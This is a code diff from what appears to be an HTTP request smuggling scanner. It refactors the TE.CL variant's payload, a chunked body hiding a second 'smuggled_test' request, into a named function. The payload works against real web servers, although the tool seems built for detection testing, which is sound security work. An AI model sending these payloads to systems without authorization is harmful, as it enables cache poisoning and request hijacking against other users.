@@ -13,6 +13,18 @@ import ssl
 import uuid
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
+
+def te_cl_body_template(nonce, host):
+    smuggled = (
+        f"GET /smuggled_test_{nonce} HTTP/1.1\r\n"
+        f"Host: {host}\r\n"
+        f"Content-Length: 5\r\n"
+        f"\r\n"
+        f"x=1\r\n"
+    )
+    return f"{hex(len(smuggled) + 5)[2:]}\r\n{smuggled}0\r\n\r\n"
+
+
 SMUGGLING_VARIANTS = {
     "cl-te": {
         "description": "Frontend uses Content-Length, backend uses Transfer-Encoding",
@@ -24,15 +36,7 @@ SMUGGLING_VARIANTS = {
     "te-cl": {
         "description": "Frontend uses Transfer-Encoding, backend uses Content-Length",
         "headers": "Transfer-Encoding: chunked\r\nContent-Length: 4\r\n",
-        "body_template": lambda nonce, host: (
-            f"{hex(len(f'GET /smuggled_test_{nonce} HTTP/1.1\r\nHost: {host}\r\nContent-Length: 5\r\n\r\nx=1\r\n') + 5)[2:]}\r\n"
-            f"GET /smuggled_test_{nonce} HTTP/1.1\r\n"
-            f"Host: {host}\r\n"
-            f"Content-Length: 5\r\n"
-            f"\r\n"
-            f"x=1\r\n"
-            f"0\r\n\r\n"
-        ),
+        "body_template": te_cl_body_template,
         "detection_nonce": True,
     },
     "te-te-obfuscation": {
